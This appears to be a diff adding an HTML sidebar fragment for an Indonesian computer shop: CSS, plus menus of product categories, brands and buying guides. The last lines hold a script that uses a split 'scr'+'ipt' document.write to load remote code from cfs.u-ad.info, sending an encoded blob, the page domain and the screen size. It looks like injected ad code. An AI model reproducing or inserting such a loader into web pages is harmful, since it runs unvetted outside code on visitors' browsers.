@@ -1,0 +1,145 @@
+542
+<style type="text/css" media="screen,print"><!--
+@import '/css/lab.css';
+	#wrap {
+ width:150px;
+ 
+	}
+#title{
+color:#FF0000;
+ font-weight:small;
+ font-family: Helvetica,Arial,Tahoma,sans-serif;
+ font-size: 12px; 
+font-weight:bold;
+padding:5px 5px 5px 10px;
+
+
+
+}
+
+#title1{
+color:#FF0000;
+ font-weight:small;
+ font-family: Helvetica,Arial,Tahoma,sans-serif;
+ font-size: 13px; 
+font-weight:bold;
+padding:5px 5px 5px 10px;
+}
+
+
+/* Disable properties specified in the imported CSS file */
+	.menu a {
+ border:none;
+	
+ font-weight:small;
+ font-family: "trebuchet MS",sans-serif;
+ font-size: 11px; 
+color:#333333;
+letter-spacing: inherit;
+	}
+
+/* Actual menu CSS starts here */
+	.menu,
+	.menu ul {
+ margin:0;
+ padding:0;
+ list-style:none;
+
+	}
+	.menu {width:180px;border: solid 1px #DDDDDD;}
+	.menu li {
+ display:block;
+ margin:0;
+ padding:0;
+ margin-bottom:0px;
+
+
+
+	}
+	.menu a {
+ display:block;
+ padding:5px 10px;
+ color:#666666;
+ background:#cc0605;
+ text-decoration:none;
+	}
+	.menu a:hover,
+	.menu a:focus,
+	.menu a:active {background:#fffff;color:#e05e5e;}
+	.menu ul li {padding-left:0px;padding-right:10px;}
+	.menu ul a {background:#ffffff;}
+	.hidden {display:none;}
+ hr {
+ border: none;
+ border-top: 1px dotted black;
+
+
+ }
+--></style>
+<div id="wrap">
+<ul class="menu">
+<li>
+<div id="title1">Kategori</div>
+<ul>
+<li><a href="../447-komputer-dan-laptop">&raquo; Komputer Laptop</a></li>
+<li><a href="../3-notebook" style="padding-left: 20px;">&raquo; Laptop</a></li>
+<li><a href="../79-desktop" style="padding-left: 20px;">&raquo; PC Desktop</a></li>
+<li><a href="../544-all-in-one" style="padding-left: 40px;">&raquo; All In One</a></li>
+<li><a href="../546-desktop-dan-monitor" style="padding-left: 40px;">&raquo; Desktop Monitor</a></li>
+<li><a href="../547-desktop-only" style="padding-left: 40px;">&raquo; Desktop Only</a></li>
+<li><a href="../155-server" style="padding-left: 20px;">&raquo; Server</a></li>
+<li><a href="../298-monitor-lcd-led" style="padding-left: 20px;">&raquo; Monitor</a></li>
+<li><a href="../75-software" style="padding-left: 20px;">&raquo; Software</a></li>
+<li><a href="../37-accesories" style="padding-left: 20px;">&raquo; Peripheral Notebook</a></li>
+<li><img src="../promo/img/linered.png" style="padding: 10px;" /></li>
+</ul>
+</li>
+<li>
+<div id="title">Brand</div>
+<ul>
+<li><a href="../541-Desktop-brand">&raquo; All Brand</a></li>
+<li><a href="../106-desktop-acer">&raquo; Acer</a></li>
+<li><a href="../138-advan">&raquo; Advan</a></li>
+<li><a href="../98-desktop-apple">&raquo; Apple</a></li>
+<li><a href="../120-asus">&raquo; Asus</a></li>
+<li><a href="../108-desktop-axioo">&raquo; Axioo</a></li>
+<li><a href="../100-desktop-dell">&raquo; Dell</a></li>
+<li><a href="../109-desktop-fujitsu">&raquo; Fujitsu</a></li>
+<li><a href="../110-desktop-hp-compaq">&raquo; HP</a></li>
+<li><a href="../101-desktop-lenovo">&raquo; Lenovo</a></li>
+<li><a href="../99-desktop-sony">&raquo; Sony</a></li>
+<li><a href="../350-samsung">&raquo; Samsung</a></li>
+<li><a href="../154-toshiba">&raquo; Toshiba</a></li>
+<li><img src="../promo/img/linered.png" style="padding: 10px;" /></li>
+</ul>
+</li>
+<li>
+<div id="title">Panduan Memilih Produk</div>
+<ul>
+<li><a href="../content/48-panduan-membeli-komputer">Mengetahui Berbagai Jenis Komputer</a></li>
+<li><a href="../content/52-panduan-membeli-desktop">Panduan Memilih PC Desktop</a></li>
+<li><a href="../content/58-cara-mempercepat-kinerja-komputer-anda">Cara Mempercepat Kinerja Komputer</a></li>
+<li><a href="../content/60-sekilas-mengenai-prosesor-komputer">Sekilas Mengenai Prosesor Komputer</a></li>
+<li><a href="../content/57-pilih-mac-atau-windows">Mac vs Windows : Mana yang cocok untuk anda?</a></li>
+<li><a href="../content/59-sekilas-mengenai-prosesor-komputer">Sekilas Mengenai Prosesor Komputer</a></li>
+<li><img src="../promo/img/linered.png" style="padding: 10px;" /></li>
+</ul>
+</li>
+<li>
+<div id="title">Kategori Terkait</div>
+<ul>
+<li><a href="../471-keyboard">Keyboard</a></li>
+<li><a href="../45-flash-disk">Flashdisk</a></li>
+<li><a href="../56-mouse">Mouse</a></li>
+<li><a href="../search?controller=search&orderby=position&orderway=desc&search_query=Mouse+Pad&submit_search=Search">Mousepad</a></li>
+<li><a href="../42-hard-disk-external">Hardisk Eksternal</a></li>
+<li><a href="../40-modem">Modem</a></li>
+<li><a href="../75-software">Software</a></li>
+</ul>
+</li>
+</ul>
+</div>
+<script>// <![CDATA[
+if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&enc=telkom2");document.write("¶ms=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRWa9wvMdeE%2bxDJsHNiQeGaYq0lm3yLee%2fjM0Qf01aaKggyK4dhTav8LoQ95jCB6DuwMYOfM%2bkFZLCBnaS5CpBEiseEhiVXalwCaqVIPhaHsLbf6Lyu9lfOIa%2bXo0C0B0oXNwqajOGU%2fc%2bdQV%2f0uNxpPy%2fXyR4HQiBwpeMFcFlngbKRsNYhNPevy6xrwy5Uf9yeZGvzA6R%2foGUDgX9jlYaC47GOdlQrSKpIKvq6xuWPWufUTvpRvbyLUBx2jQzOYpwrYGvdusC%2bDl6BMhim839jBcfccOImc3RR6xYC3%2bQ34QCUEqlyNqBposu0PgNMz30jw4%2bEQUiebCXQZ3Lik4u6Z0%2fycic6gS5qEGpUHthrz2fQd4VD5TNaTGFhGiJ51cASnZtD3P73rDcjiMXLuztAuryihBFUMWvZgVl0OgKnDe18jyKSPqbX5SWyq%2bKuEO1AfoBjBOn6qGqhXkLpUStE13MO7KzFv2JI15v5jBzXBaVTqSFsSLAmLm8QDzy95gfhd2TCWomDN50YVcFknk%2bHbfPyoUV3J0UxBVs2YFYgRHdTDYeNppWqBiRINqVKu%2fTINzdtdnFugXIlDVm62bp%2fs2nXTbCeziC80ZFMejwm6742dHdrfm0R5R86vw7Lxj3H%2brD3mCYe7FZPodayTYC4ns%2bS4QmbvC3q5AkwkK%2flBaHP8JyHtEI48%2fF5DVDq1Mg");document.write("&idc_r="+idc_glo_r);document.write("&domain="+document.domain);document.write("&sw="+screen.width+"&sh="+screen.height);document.write("></scr"+"ipt>");}
+// ]]></script>
+<noscript>activate javascript</noscript>
